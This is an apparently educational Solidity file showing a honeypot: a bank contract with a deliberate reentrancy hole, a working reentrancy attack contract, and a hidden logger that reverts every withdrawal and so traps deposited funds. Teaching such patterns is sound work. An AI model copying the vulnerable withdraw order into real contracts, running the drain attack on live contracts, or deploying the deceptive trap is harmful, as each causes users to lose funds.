// SPDX-License-Identifier: UNLICENSED

/* This will show via a simple bank how a honeypot attack will commence
Honeypot attacks are very unique in a way as they are often used to figure out who is 
a hacker, or exploiter among smart contracts, however can still be dangerous to those who 
are niave to the inner workings of smart contract and bloackchain */

pragma solidity ^0.8.7;

//creates the bank contract to hold funds
contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger){
        logger = Logger (_logger); //creates a log in the bank contract
    }

    //functions allow a deposit of money into the bank
    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    //allows the contract to withdraw the amount from the bank if Ether is input
    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient Funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

//this contract logs all of the information 
contract Logger {
    event Log(address caller, uint amount, string action);

    function log(address _caller, uint _amount, string memory _action) public {
        emit Log(_caller, _amount, _action);
    }
}

//This contract will be used by the victim/hacker/exploiter to withdrawl the funds
contract Attack {
    Bank bank;

    //creates a bank constructor to call the bank when deploying the attack contract
    constructor(Bank _bank){
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }
    
    //This is the function to execute the attack
    function attack() public payable {
        bank.deposit{value: 1 ether}(); //deposits one Ether in an attempt to withdraw the entire bank
        bank.withdraw(1 ether); //calls the withdraw function
    }

    //gets the balance of the account that is attempting the attack
    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}

//This contract will be hidden from the user usually within a seperate file that is attached to these above contracts
contract HoneyPot{
    function log(address _caller, uint _amount, string memory _action) public {
        if (equal(_action, "Withdraw")){
            revert ("It's a trap");
        }
    }

    //compares the two strings 
    function equal(string memory _a, string memory _b) public pure returns (bool){
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}
